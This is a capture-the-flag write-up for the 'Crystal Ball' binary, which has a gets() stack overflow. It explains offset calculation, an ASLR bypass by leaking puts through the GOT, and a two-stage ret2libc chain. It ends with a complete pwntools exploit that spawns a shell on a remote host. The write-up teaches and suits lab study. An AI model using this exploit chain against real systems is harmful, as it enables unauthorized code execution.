## Crystal Ball - BOF and ret2libc

### Challenge Overview: A Generous Compiler and a Dangerous Function

The binary ships as a non-stripped, 64-bit ELF executable under Ubuntu 24.04, served raw via `socat` with no wrapper script. The protection profile is immediately informative: **no PIE** (binary loads at fixed addresses), **NX enabled** (stack is non-executable), **no stack canary**, and **partial RELRO** (GOT entries are writable and lazily resolved). This combination is the canonical setup for a ret2libc attack, where the objective is not to inject shellcode but to redirect control flow through existing executable code — specifically through the C standard library.

What distinguishes this challenge from a generic ret2libc exercise is a deliberate compiler hint embedded in the source:

```c
__attribute__((naked)) void pop_rdi_ret(void) {
    __asm__("pop %rdi; ret");
}
```

The `__attribute__((naked))` directive instructs the compiler to emit the function body with no prologue or epilogue whatsoever. The resulting machine code is exactly two instructions: `pop rdi` followed by `ret`. This function is compiled into the binary at the fixed address `0x4011fb`, and its symbol is exported in the non-stripped binary. The challenge author is explicitly providing the ROP gadget that a ret2libc exploit requires, signaling that the intended technique is understood and the difficulty lies in assembling the pieces correctly.

The single vulnerability is found in `vuln()`:

```c
void vuln() {
    char buffer[64];
    puts("The stars know your destiny...");
    printf("Tell me your wish: ");
    gets(buffer);         // unbounded read — no length check whatsoever
    puts("The stars have spoken!");
}
```

`gets()` is the most dangerous input function in the C standard library. It reads from `stdin` until a newline or EOF with no respect for the destination buffer's size, making any buffer it writes into trivially overflowable. The POSIX standard removed `gets()` entirely in 2011, and modern compilers emit a linker warning when it is used. Here, it writes into a 64-byte stack buffer with no restriction.

### Vulnerability Analysis: Stack Layout and Offset Calculation

The stack frame of `vuln()` on x86-64 is structured as follows:

```
Higher addresses (caller's frame)
┌─────────────────────────────────────┐
│  Saved RIP (return address)         │  ← overwrite target
├─────────────────────────────────────┤
│  Saved RBP                          │  ← 8 bytes
├─────────────────────────────────────┤
│  buffer[0..63]      (64 bytes)      │  ← gets() writes here
└─────────────────────────────────────┘
Lower addresses (stack grows downward)
```

The offset from the start of `buffer` to the saved return address is therefore `64 + 8 = 72 bytes`. Any input longer than 72 bytes overwrites the return address with the bytes at positions 72 through 79. This is confirmed empirically by sending a De Bruijn cyclic sequence and inspecting the resulting core dump: the value at `rsp` at the moment of the crash encodes the offset, which `cyclic_find()` resolves to precisely **72**.

### Exploit Strategy: ret2libc with ASLR Bypass

ASLR randomizes the base address of `libc` at every execution, meaning the runtime addresses of `system()`, `/bin/sh`, and any libc gadgets are unknowable without a leak. The binary itself has no leak primitive such as a format string vulnerability, so the leak must be engineered through the overflow — by redirecting execution to a sequence that _prints_ a known libc address before returning control for a second payload.

This is the defining structure of a **ret2plt leak**: the PLT stub for `puts` is called with the GOT entry for `puts` as its argument, causing `puts` to print the 8-byte runtime address stored in that GOT slot. Since the GOT slot contains the resolved address of `puts` in the loaded libc image, subtracting the known offset of `puts` from the start of libc yields the libc base. All other symbols follow by addition.

The exploit therefore requires **two passes** through `vuln()`. After the leak, execution is redirected back to `main()` (whose address is fixed, since PIE is disabled), which calls `vuln()` again and presents a second opportunity to send a payload — this time a fully resolved ROP chain.

#### Why Return to `main()` and Not `vuln()` Directly

Returning to the entry point of `vuln()` would work functionally, but `main()` is the safer choice. It re-executes `setup()`, which re-initializes the `setvbuf` settings, and it issues the welcome banner, making the program state predictable. More importantly, it avoids any assumption about `vuln()`'s prologue leaving the stack in a consistent state after an overflowed return.

### Stage 1 — Leaking the `puts` Runtime Address

The first ROP chain arranges the following sequence of return addresses on the stack, beginning at offset 72:

```
[ 72 bytes padding         ]
[ pop rdi; ret   @ 0x4011fb ]   ← load rdi with next value
[ puts@GOT       @ 0x404000 ]   ← rdi = pointer to puts' GOT slot
[ puts@PLT       @ 0x401074 ]   ← call puts(puts@GOT) → prints 8 bytes
[ main           @ 0x401256 ]   ← return here for second payload
```

When `vuln()` executes its `ret` instruction, the CPU pops `0x4011fb` into `rip` and begins executing the `pop rdi` instruction. That instruction pops `0x404000` (the GOT address) into `rdi`, then `ret` pops `0x401074` (the PLT stub) into `rip`. `puts(0x404000)` is now called with `rdi` set correctly per the System V AMD64 ABI, printing the 8-byte content of the GOT slot as a null-terminated string. After `puts` returns, execution falls through to `main`.

The leak is received and parsed:

```python
leaked    = p.recvline().strip()
puts_addr = u64(leaked.ljust(8, b'\x00'))

libc.address = puts_addr - libc.sym['puts']
```

The `.ljust(8, b'\x00')` padding handles the case where the most-significant bytes of the address are null, which `puts` stops printing at — a subtlety that will silently corrupt the leak if omitted.

> **Key insight:** The PLT stub for `puts` and the GOT entry for `puts` are at _different_ addresses. `puts@PLT` is executable code that resolves and jumps to the real `puts` via the GOT. `puts@GOT` is a writable data slot holding the runtime address. Calling `puts@PLT` with `rdi = puts@GOT` causes the real `puts` to print the 8 bytes at the GOT slot — i.e., its own runtime address. This is the canonical ret2plt leak.

### Stage 2 — `system("/bin/sh")` via Rebased libc Symbols

With `libc.address` set, pwntools rebases all symbol lookups automatically. The second ROP chain calls `system("/bin/sh")`:

```python
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
```

The leading `ret` gadget is mandatory. The System V AMD64 ABI requires the stack pointer to be 16-byte aligned at the moment of a `call` instruction. When `vuln()` returns into the ROP chain, `rsp` is misaligned by 8 bytes (the return address has just been popped). Adding a single `ret` gadget advances `rsp` by 8 before entering `system()`, restoring alignment. Without it, `system()` raises a `SIGSEGV` on the first `movaps` SSE instruction.

```
[ 72 bytes padding         ]
[ ret            @ 0x40101a ]   ← stack realignment
[ pop rdi; ret   @ 0x4011fb ]   ← rdi = &"/bin/sh"
[ /bin/sh addr   (libc)     ]   ← first argument to system
[ system addr    (libc)     ]   ← call system("/bin/sh")
```

### Full Annotated Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# ── Constants (all fixed: no PIE) ────────────────────────────────────────────
OFFSET    = 72                        # buffer[64] + saved RBP[8]
POP_RDI   = elf.sym['pop_rdi_ret']   # 0x4011fb — gifted by the author
RET       = 0x40101a                  # ret gadget for 16-byte alignment
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']

def conn():
    if args.LOCAL:
        return process(elf.path)
    return remote("target.host", 1337)

r = conn()

# ── Stage 1: leak puts → compute libc base ───────────────────────────────────
r.recvuntil(b'wish: ')

stage1 = flat(
    b'A' * OFFSET,
    p64(POP_RDI),
    p64(PUTS_GOT),     # rdi = &puts (GOT slot)
    p64(PUTS_PLT),     # call puts(rdi) → prints runtime address of puts
    p64(MAIN),         # loop back for second payload
)
r.sendline(stage1)

r.recvuntil(b'spoken!\n')
puts_addr    = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts @ {puts_addr:#x}")

libc.address = puts_addr - libc.sym['puts']
log.info(f"libc base @ {libc.address:#x}")

# ── Stage 2: system("/bin/sh") ───────────────────────────────────────────────
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

r.recvuntil(b'wish: ')

stage2 = flat(
    b'A' * OFFSET,
    p64(RET),          # align stack to 16 bytes
    p64(POP_RDI),
    p64(binsh),        # rdi = "/bin/sh\0"
    p64(system),       # call system("/bin/sh")
)
r.sendline(stage2)
r.recvuntil(b'spoken!\n')

r.interactive()
```

### Stack Layout Reference

```
Stage 1 — after gets() overwrites the frame of vuln()

 rsp at ret →  [ pop rdi; ret   @ 0x4011fb  ]  ← rip after ret
               [ puts@GOT addr  @ 0x404000  ]  ← popped into rdi
               [ puts@PLT addr  @ 0x401074  ]  ← rip after pop rdi; ret
               [ main addr      @ 0x401256  ]  ← rip after puts returns

Stage 2 — second pass through vuln()

 rsp at ret →  [ ret            @ 0x40101a  ]  ← stack alignment
               [ pop rdi; ret   @ 0x4011fb  ]
               [ /bin/sh addr   (libc)       ]  ← rdi = "/bin/sh"
               [ system addr    (libc)       ]  ← call system()
```

### Key Takeaways

> The ret2libc pattern with an ASLR bypass via a ret2plt leak is the foundational exploit primitive for NX-protected binaries without PIE. The format string vulnerability seen in other challenges is one way to obtain a leak; engineering the leak through the overflow itself — by calling `puts(puts@GOT)` and returning to `main` — is the alternative when no other information-disclosure primitive is available.

The challenge reinforces three layered concepts. First, the PLT/GOT mechanism: lazy binding means that after the first call to any imported function, the GOT slot holds its true runtime address, making it a reliable read target for an ASLR bypass. Second, the two-pass exploit structure: the first overflow creates the leak and restores a known program state; the second overflow delivers the shell payload with fully resolved addresses. Third, the 16-byte stack alignment requirement for `system()`: this constraint is invisible until the exploit silently crashes inside `movaps`, and the single-`ret` remedy is a standard technique that every ret2libc exploit must apply.

The explicitly compiled `pop_rdi_ret` function is also pedagogically significant — it mirrors the real-world practice of searching a binary or its loaded libraries for useful gadgets, while removing the mechanical complexity of that search so the focus remains on the exploit chain itself.